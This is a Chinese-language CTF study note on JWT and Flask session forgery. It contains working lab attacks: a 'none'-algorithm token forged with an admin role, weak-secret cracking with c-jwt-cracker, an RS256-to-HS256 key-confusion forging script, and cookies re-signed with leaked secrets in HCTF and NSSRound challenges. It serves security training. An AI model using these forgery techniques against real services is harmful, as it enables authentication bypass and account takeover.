# JWT和session伪造总结

[TOC]

----

![JWT（Json Web Token）とは？トークンのデータ構造と暗号化の仕組み。 │ Ugo](https://gitee.com/bx33661/image/raw/master/path/jwt-logo-1024x515.png)

JWT: https://jwt.io/#encoded-jwt

## 基本

> 摘抄资料

JWT（JSON Web Token）是一种基于JSON格式的紧凑、安全的方式，用于在各方之间传输信息，特别是用于身份验证和授权。JWT的主要特点包括以下几个方面：

### 1. 结构

JWT由三个部分组成，每部分之间用点（`.`）分隔：

- **Header（头部）**：通常包含两部分信息：令牌类型（即“JWT”）和所使用的签名算法（如HMAC SHA256或RSA）。

- **Payload（负载）**

  ：包含声明（Claims），这些声明是关于实体（通常是用户）及其他数据的。声明可以分为三类：

  - Registered Claims：预定义的声明，如`iss`（签发者），`exp`（过期时间），`sub`（主题），`aud`（受众）等。
  - Public Claims：用户自定义的声明，但应避免使用冲突的命名。
  - Private Claims：应用间共享的信息。

- **Signature（签名）**：签名是为了确保令牌未被篡改。它由编码后的头部和负载组合，并使用指定的签名算法加密形成。

### 2. 工作原理

1. **签发JWT**：当用户登录时，服务器会验证用户的身份，如果验证通过，服务器会生成一个JWT，其中包含用户的相关信息（如用户ID）。这个JWT会签名并发送给用户。
2. **客户端存储JWT**：客户端（通常是浏览器）会将这个JWT存储起来，通常存放在`localStorage`或`sessionStorage`中。
3. **客户端请求携带JWT**：当客户端向服务器发送请求时，会将JWT附加在HTTP请求的`Authorization`头部中（通常是`Bearer`模式）。
4. **服务器验证JWT**：服务器会验证JWT的签名，并检查它的有效性（如过期时间等）。如果验证通过，服务器会处理请求并返回响应。

















### 敏感信息泄露

> jwt一般是作为题目的一个部分，这种直接泄露信息的基本没有

```
eyJBRyI6Ijk1MGZjYzJiZGQyZjQ0MX0iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImJ4MzM2NjEiLCJwYXNzd29yZCI6InpieDEyMzQ1NiIsIkZMIjoiY3RmaHViezY3MjQ5YTA5ZCJ9.eNgGhgI2-Bf_txI0cGiS64HfDeErXt2p2mT5UA7E_zU
```

![image-20241026150303406](https://gitee.com/bx33661/image/raw/master/path/image-20241026150303406.png)

得到flag

```
ctfhub{67249a09d950fcc2bdd2f441}
```



### 无签名

根据了解最初jwt是为了调试，添加了空（None）算法,这样的话我们的JWT就可以随意通过服务器的验证

```python
{
  "alg": "None",
  "typ": "JWT"
}
```

缺少签名算法，jwt保证信息不被篡改的功能就失效了



> 题目提示：
>
> 一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。尝试找到 flag。

进入页面，注册admin/123456,查看cookie

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiZ3Vlc3QifQ.MaphZVk25q4stXxAmEgXmKCW7aUo3jDJtgv9DwahLwc

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiZ3Vlc3QifQ
MaphZVk25q4stXxAmEgXmKCW7aUo3jDJtgv9DwahLwc
```

![image-20240827164720451](https://gitee.com/bx33661/image/raw/master/path/image-20240827164720451.png)

修改加密算法为`none`

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=
```

修改权限为`admin`

```
eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ
```

最后的构造：

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjMiLCJyb2xlIjoiYWRtaW4ifQ.
```

![image-20241027165046523](https://gitee.com/bx33661/image/raw/master/path/image-20241027165046523.png)

提交之后得到flag

```
Hello admin(admin), only admin can get flag.
ctfhub{72d9055351fb13a911387e5c}
```





### 弱密钥

就是对于密钥比较简单的我们可以通过爆破的手段，获得密钥

> 对称密码

进入页面，注册admin/123456,查看cookie

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiZ3Vlc3QifQ.7KnITDRIAh7AyiR7ZdoqZPI7Dm0FfucDxLD5DRvLDdU.
```

![image-20240827170321755](https://gitee.com/bx33661/image/raw/master/path/image-20240827170321755.png)

安装一个工具`c-jwt-cracker`，也可以使用"[JWT_tool](https://github.com/ticarpi/jwt_tool)"

```bash
git clone https://github.com/brendan-rius/c-jwt-cracker.git
sudo apt install gcc
sudo apt install make
#确保你已经安装openssl
sudo apt-get update
sudo apt-get install libssl-dev

make


#使用
./jwtcrack token
```

![image-20240827163718735](https://gitee.com/bx33661/image/raw/master/path/image-20240827163718735.png)

![image-20240827163928848](https://gitee.com/bx33661/image/raw/master/path/image-20240827163928848.png)

得到密钥是mqwr,修改JWT后得到

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicGFzc3dvcmQiOiIxMjM0NTYiLCJyb2xlIjoiYWRtaW4ifQ.aontCOVinnmKgiIxqni6kFwghAcXzjSyK9ayfwG7gBc
```

![image-20240827164106654](https://gitee.com/bx33661/image/raw/master/path/image-20240827164106654.png)

得到flag

```
ctfhub{d458c74724065f3a63099b1c}
```



### 修改签名算法

JWT中用的加密方式一般是：

- `HMAC`-------------------------HMAC（Hash-based Message Authentication Code，基于哈希的消息认证码）是一种广泛使用的消息认证码，用于验证消息的完整性和真实性。它结合了哈希函数（如 SHA-256、SHA-1 或 MD5）和密钥
- `RSA`

在jwt使用中利用两种算法的私钥对`signature`加密



修改签名算法利用的是，下面的header如下，使用了RSA

```python
{
  "typ": "JWT",
  "alg": "RS256"
}
```

我们如果可以获取到这个加密的公钥的话，我们可以修改加密算法，使用我们获取的公钥作为算法`HMAC`的密钥,进行验证

```python
{
  "typ": "JWT",
  "alg": "HS256"
}
```



一个例子：

> 题目提示：
>
> 有些JWT库支持多种密码算法进行签名、验签。若目标使用非对称密码算法时，有时攻击者可以获取到公钥，此时可通过修改JWT头部的签名算法，将非对称密码算法改为对称密码算法，从而达到攻击者目的。

进入页面发现`publickey.pem`

```ABAP
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3/YJZ/OAQFDwtltlGrvn
wwRtvPixoZPTdkx7Nsn8bahOhOneb0IyrcznZbLomhaRZ2pHXOBgrtkOS8IWST9G
/06b+3n/TblGVj/ACXwPAeRzXSGuGzai+dxqLES2Xok+EBm8N0g90mB4yY9EFQc/
BCLFgnIc0Ylcx1ov+Ai9cJLCibbJtzM11p/I0oKBXBF4PjweCnL+gASO4mS+F+TR
1QcNE0uqd0GNCG+kMzBtGIiX+ulXawKOpyQY4PDc0y5yJHFL5+FX/QvbaOnmZ90K
da6JpXOAyO493ezEqLearwJalronv7vtDwksMvJSExlYGxrvk0nT7Xm6M6ufjdBF
rwIDAQAB
-----END PUBLIC KEY-----
```

下面一行本环境的源码

```php+HTML
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
        <title>CTFHub JWTDemo</title>
        <link rel="stylesheet" href="/static/style.css" />
    </head>
    <body>
        <main id="content">
            <header>Web Login</header>
            <form id="login-form" method="POST">
                <input type="text" name="username" placeholder="Username" />
                <input type="password" name="password" placeholder="Password" />
                <input type="submit" name="action" value="Login" />
            </form>
            <a href="/publickey.pem">publickey.pem</a>
        </main>
        <?php echo $_COOKIE['token'];?>
        <hr/>
    </body>
</html>

<?php
require __DIR__ . '/vendor/autoload.php';
use \Firebase\JWT\JWT;

class JWTHelper {
  public static function encode($payload=array(), $key='', $alg='HS256') {
    return JWT::encode($payload, $key, $alg);
  }
  public static function decode($token, $key, $alg='HS256') {
    try{
            $header = JWTHelper::getHeader($token);
            $algs = array_merge(array($header->alg, $alg));
      return JWT::decode($token, $key, $algs);
    } catch(Exception $e){
      return false;
    }
    }
    public static function getHeader($jwt) {
        $tks = explode('.', $jwt);
        list($headb64, $bodyb64, $cryptob64) = $tks;
        $header = JWT::jsonDecode(JWT::urlsafeB64Decode($headb64));
        return $header;
    }
}

$FLAG = getenv("FLAG");
$PRIVATE_KEY = file_get_contents("/privatekey.pem");
$PUBLIC_KEY = file_get_contents("./publickey.pem");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!empty($_POST['username']) && !empty($_POST['password'])) {
        $token = "";
        if($_POST['username'] === 'admin' && $_POST['password'] === $FLAG){
            $jwt_payload = array(
                'username' => $_POST['username'],
                'role'=> 'admin',
            );
            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
        } else {
            $jwt_payload = array(
                'username' => $_POST['username'],
                'role'=> 'guest',
            );
            $token = JWTHelper::encode($jwt_payload, $PRIVATE_KEY, 'RS256');
        }
        @setcookie("token", $token, time()+1800);
        header("Location: /index.php");
        exit();
    } else {
        @setcookie("token", "");
        header("Location: /index.php");
        exit();
    }
} else {
    if(!empty($_COOKIE['token']) && JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY) != false) {
        $obj = JWTHelper::decode($_COOKIE['token'], $PUBLIC_KEY);
        if ($obj->role === 'admin') {
            echo $FLAG;
        }
    } else {
        show_source(__FILE__);
    }
}
?>
```

进入页面，注册admin/123456,查看cookie

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6Imd1ZXN0In0.wVLgMjzI-NnAeVTL4aMLuARJPJsizGuJc6wbP3dq5ExxlciEgcC3Ln2TU7pxSo8MV-MiofGd6lrBDXsBwTRUly4FiiMN1fOjRRQNZtVV4oEc1l9u21PxZt94uiMgePVK2U1nIqBZnl50HqCzqq4KH5M7zJiLKBBuYa9qr7y3uFmJYWIN2xKmi9xmQg1Ax2wnoGbXbtQWzex9mZ8nLjAWhulnhHbUlpYkiIKemoh23tR0PHbYlHxjAkQQdLJbxYv4RDMx80wrGHbbhSRRjn9_9ZVp06coL37VXr2heDokutzl_-5iFtPV51vJLMzBWyx4NUqELjzlW45GF1LXuPhcSg
```

![image-20240827170553593](https://gitee.com/bx33661/image/raw/master/path/image-20240827170553593.png)

```python
# -*- coding: utf-8 -*-
import hmac
import hashlib
import base64

# 打开并读取 publickey.pem 文件
with open('publickey.pem', 'r') as file:
    key = file.read()

# 定义 JWT 的头部和载荷
header = '{"typ": "JWT", "alg": "HS256"}'
payload = '{"username": "admin", "role": "admin"}'

# 编码头部
encodeHBytes = base64.urlsafe_b64encode(header.encode("utf-8"))
encodeHeader = str(encodeHBytes, "utf-8").rstrip("=")

# 编码载荷
encodePBytes = base64.urlsafe_b64encode(payload.encode("utf-8"))
encodePayload = str(encodePBytes, "utf-8").rstrip("=")

# 拼接头部和载荷
token = encodeHeader + "." + encodePayload

# 创建签名
sig = base64.urlsafe_b64encode(hmac.new(bytes(key, "utf-8"), token.encode("utf-8"), hashlib.sha256).digest()).decode("utf-8").rstrip("=")

# 输出最终的 JWT
print(token + "." + sig)
```

---->

```python
eyJ0eXAiOiAiSldUIiwgImFsZyI6ICJIUzI1NiJ9.eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0.TKLWmpJhNpSKqkztiZY4QQC0nYnICLjAe5UMyAE9a24
```



### [CISCN2019 华北赛区 Day1 Web2]ikun

> 其中一步

访问`/b1g_m4mber`

提示需要admin才能访问，我们之前观察到的cookie里面的jwt，我们现在使用`c-jwtcrack`爆破这个密钥---------------> ·1Kun·

![image-20241026144241906](https://gitee.com/bx33661/image/raw/master/path/image-20241026144241906.png)

```python
import jwt

# 泄露的密钥
secret_key = "1Kun"

# 载荷数据
payload = {
    "username": "admin"
}

# 生成JWT
new_token = jwt.encode(payload, secret_key, algorithm="HS256")
print("新生成的JWT:", new_token)
```

加密:

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.40on__HQ8B2-wM1ZSwax3ivRK4j54jlaXv-1JjQynjo
```

进入页面寻找线索：



## 脚本工具

JWT在线网站：**https://jwt.io/#encoded-jwt**

### jwt编码与解码脚本

编码--->

```python
import jwt

# 泄露的密钥
secret_key = "1Kun"

# 载荷数据
payload = {
    "username": "admin"
}

# 生成JWT
new_token = jwt.encode(payload, secret_key, algorithm="HS256")
print("新生成的JWT:", new_token)
```

解码--->

```python
import jwt

# JWT密钥
secret_key = ""

# JWT令牌
jwt_token = ""

try:
    # 解密JWT
    decoded_payload = jwt.decode(jwt_token, secret_key, algorithms=["HS256"])
    print("解密后的载荷:", decoded_payload)
except jwt.ExpiredSignatureError:
    print("JWT已过期")
except jwt.InvalidTokenError:
    print("无效的JWT")
```



`c-jwt-cracker`工具

> A multi-threaded JWT brute-force cracker written in C. If you are very lucky or have a huge computing power, this program should find the secret key of a JWT token, allowing you to forge valid tokens. This is for testing purposes only, do not put yourself in trouble :)

```python
git clone https://github.com/brendan-rius/c-jwt-cracker.git
sudo apt install gcc
sudo apt install make
#确保你已经安装openssl
sudo apt-get update
sudo apt-get install libssl-dev

make


#使用
./jwtcrack token
```



`jwt_tools`:

https://github.com/ticarpi/jwt_tool

Install:

```python
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt
```

Usage:

```python
python3 jwt_tool.py eyJBRyI6Ijk1MGZjYzJiZGQyZjQ0MX0iLCJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImJ4MzM2NjEiLCJwYXNzd29yZCI6InpieDEyMzQ1NiIsIkZMIjoiY3RmaHViezY3MjQ5YTA5ZCJ9.eNgGhgI2-Bf_txI0cGiS64HfDeErXt2p2mT5UA7E_zU
```

![image-20241027173740260](https://gitee.com/bx33661/image/raw/master/path/image-20241027173740260.png)



## session伪造

```python
from flask import Flask, request, session, redirect, url_for, render_template_string

app = Flask(__name__)

# 设置一个密钥，用于签署会话数据
app.secret_key = 'your_secret_key_here'

# 主页
@app.route('/')
def index():
    if 'username' in session:
        return f'Hello, {session["username"]}! <a href="{url_for("logout")}">Logout</a>'
    return 'Hello, Guest! <a href="{url_for("login")}">Login</a>'

# 登录页面
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        session['username'] = username
        return redirect(url_for('index'))
    return '''
        <form method="post">
            Username: <input type="text" name="username">
            <input type="submit" value="Login">
        </form>
    '''

# 注销功能
@app.route('/logout')
def logout():
    session.pop('username', None)
    return redirect(url_for('index'))

if __name__ == '__main__':
    app.run(debug=True)
```

![image-20241027180040850](https://gitee.com/bx33661/image/raw/master/path/image-20241027180040850.png)

大体解码获取信息可以使用,大佬脚本

```python
#!/usr/bin/env python3
import sys
import zlib
from base64 import b64decode
from flask.sessions import session_json_serializer
from itsdangerous import base64_decode

def decryption(payload):
    payload, sig = payload.rsplit(b'.', 1)
    payload, timestamp = payload.rsplit(b'.', 1)

    decompress = False
    if payload.startswith(b'.'):
        payload = payload[1:]
        decompress = True

    try:
        payload = base64_decode(payload)
    except Exception as e:
        raise Exception('Could not base64 decode the payload because of '
                         'an exception')

    if decompress:
        try:
            payload = zlib.decompress(payload)
        except Exception as e:
            raise Exception('Could not zlib decompress the payload before '
                             'decoding the payload')

    return session_json_serializer.loads(payload)

if __name__ == '__main__':
    print(decryption(sys.argv[1].encode()))
```

![image-20241027180346873](https://gitee.com/bx33661/image/raw/master/path/image-20241027180346873.png)



做题中题目需要对我们的信息进行验证，我们需要伪造session，具体思路我感觉是这样的

- 获取信息，知道我们要伪造什么信息
- 寻找密钥
- 伪造提交



具体工具使用：

https://github.com/noraj/flask-session-cookie-manager



**[HCTF 2018]admin**

---

随便注册一个账号

![image-20241011215558037](https://gitee.com/bx33661/image/raw/master/path/image-20241011215558037.png)

```
<!-- you are not admin -->
```

我们发现session，那现在xueyao

在change代码界面找到源代码的github地址,解码：

```python
PS E:\gitcode\flask-session-cookie-manager-1.2.1.1\flask-session-cookie-manager-1.2.1.1> python flask_session_cookie_manager3.py decode -s "ckj123" -c ".eJw9UMuKwjAU_ZXhrl30pQvBhRIndCC3tKSGm41ora251oF2BjXiv09xwPV5nwdsj309tDA_7s5DPYHt6QDzB3zsYQ7WNbfMoFOOPfnyZkV6tzpNsMNOOYqU3LQoywR9HlpZ3slVAUoVo6ZpJjhQWkWjziuXJ9blsZWFUyKNM0OJFc2N3Oo8aq_o1x59FY_sQMk0UL65ZrqZkj6wMp9tJuieibUnU8akqxDdMrEGGfXYQ3OEolrAcwLV0B-3P99cX94TyHEwRnuM1glFaWx1E5EumMymQ9Gy1V9sXcFW5lflV2cyaUD54mV36nZN_XbKL7iplv_IZdeNADDzbDaDCfwOdf86DsIQnn_9ZWzO.ZwkvZA.WqHSn3iY9Y0siqmVfZ69q2NQso8"
{'_fresh': False, '_id': b'f819cc293c51d22e286cf2660ea4e8745de2b744c7569894136c53248f47ddc0279f8d81b0e7407137773f40b4380989a7d1aa862813ae7a75608ecd53f19647', 'csrf_token': b'b94f437a8cb7e86a4daef48de2df4ddd030eab4a', 'image': b'BsUp', 'name': 'kkk666', 'user_id': '11'}
```

编码：

```python
PS E:\gitcode\flask-session-cookie-manager-1.2.1.1\flask-session-cookie-manager-1.2.1.1> python flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'_fresh': False, '_id': b'f819cc293c51d22e286cf2660ea4e8745de2b744c7569894136c53248f47ddc0279f8d81b0e7407137773f40b4380989a7d1aa862813ae7a75608ecd53f19647', 'csrf_token': b'b94f437a8cb7e86a4daef48de2df4ddd030eab4a', 'image': b'BsUp', 'name': 'admin', 'user_id': '11'}"
.eJw9UMuKwjAU_ZXhrl305UZwocQJHcgtlbThZiO178R2wM6gjfjvUxxwfd7nAafmWk8dbJriMtUrOPUVbB7wcYYNaNPeE4VGGOvIZXfN4lnLOMIBB2EoEDzvkGcRutTXPJvJlB5yEaKkdcKsJ6QIFp0TJo20SUPNj0awOEwURZq1dzL7y6K9oTs4dGW4sD3BY0-49pbIdk2yskJ9dgmjOWEHRyoLSZY-ml2kFVqUSw9pA2TlFp4rKKdrc_r5tvX4nkDGeku0w-AQURCHWrYByaMllQ_IOqvll9XmaDVPb8LtL6Rij9Lty64firZ-O6Uj5uXuHxmLYQGgqIZ-hBX8TvX19Rv4Pjz_AJhNbPQ.ZwkwQQ.j5yClHogHshbwpaniLOkHLBE6us
```

访问index界面

![image-20241011220516456](https://gitee.com/bx33661/image/raw/master/path/image-20241011220516456.png)





**[NSSRound#13 Basic]flask?jwt?**

1. 进入页面发现需要登录，尝试一下登录不进去，我们就注册一个账号，登录进入另一个界面

   ![image-20240821153816950](https://gitee.com/bx33661/image/raw/master/path/image-20240821153816950.png)

   点击拿flag，得到我不是admin的提示

2. 分析一下cookie内容，结合题目发现是session构造

3. 查了资料，下载脚本：https://github.com/noraj/flask-session-cookie-manager

4. 在忘记密码页面,得到：secretkey

```
<!-- secretkey: th3f1askisfunny -->
```

5. 解码

```
python flask_session_cookie_manager3.py decode -s “th3f1askisfunny” -c “.eJwljjkOwzAMwP6iuYPs6LDzmUCyJbRr0kxF_14DBVcS4AeOPON6wv4-73jA8Zqwg1NULhlNhAubKBtLOCc6U0fCqQONCZe3bVRJk2YzbZUGzRoi5L2kF-IM7Gk0o2uiVhZNaSV0uBfpNGnTYbZ6xtIXiSgT1sh9xfm_qfD9AV9VLiU.ZsWZAw.serOtgnY1BhZSNuOx3aYEYkg34Y”

#结果
{'_fresh': True, '_id': 'b4e251fe866515a675a56eb5f0b549040d7c0a5404e2334247f4d8a7824c4d2e664b91fb145fe09fa4de97f072567f681e7cbb1694d437caa7f45019191f006d', '_user_id': '2'}
```

6. 编码

```
#待编码内容
{'_fresh': True, '_id': 'b4e251fe866515a675a56eb5f0b549040d7c0a5404e2334247f4d8a7824c4d2e664b91fb145fe09fa4de97f072567f681e7cbb1694d437caa7f45019191f006d', '_user_id': '1'}

#编码结果：
.eJwljjkOwzAMwP6iuYPk6LDzmUC2JbRr0kxF_14DBVcS4AeOPON6wv4-73jA8ZqwQ-coQhlVVUhcTVw0uiR24YaM0wa6MC5v27iwJc_qVgsPniVUuTfKTiwZ2NJ5RrNEK6KWWils9E7aePJmw331gtQWiagT1sh9xfm_Ifj-AF9SLiQ.ZsWaSQ.YVMvNUkro2QI49RcVyr_VOoQIdw
```

提交到cookie，点击按钮拿到flag

